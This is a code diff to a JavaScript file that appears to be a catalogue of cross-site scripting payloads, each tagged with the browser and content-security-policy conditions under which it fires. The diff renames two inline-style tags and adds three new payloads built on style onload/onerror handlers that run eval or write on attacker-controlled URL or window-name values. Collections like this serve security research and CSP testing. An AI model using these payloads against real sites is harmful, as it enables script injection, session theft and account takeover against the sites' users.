@@ -3,7 +3,8 @@ const TAGS = {
     firefox: 'firefox',
     safari: 'safari',
     unsafeInline: 'script-unsafe-inline',
-    unsafeInlineStyle: 'style-unsafe-inline',
+    inlineStyleAllow: 'style-inline-allowed',
+    inlineStyleBlock: 'style-inline-blocked',
     unsafeEval: 'unsafe-eval',
     scripts: 'external-scripts',
     iframes: 'external-iframes',
@@ -71,7 +72,22 @@ const PAYLOADS = [
     },
     {
         html: "<style/onload=eval(name)>",
-        tags: [TAGS.chrome, TAGS.unsafeInlineStyle, TAGS.controlsName, TAGS.unsafeEval],
+        tags: [TAGS.chrome, TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval],
         author: null
-    }
+    },
+    {
+        html: "<style/onload=write(URL)>",
+        tags: [TAGS.safari, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
+        author: '@kinugawamasato'
+    },
+    {
+        html: "<style/onload=eval(`'`+URL)>",
+        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
+        author: '@wcbowling'
+    },
+    {
+        html: "<style/onerror=eval(name)>",
+        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleBlock],
+        author: null
+    },
 ]
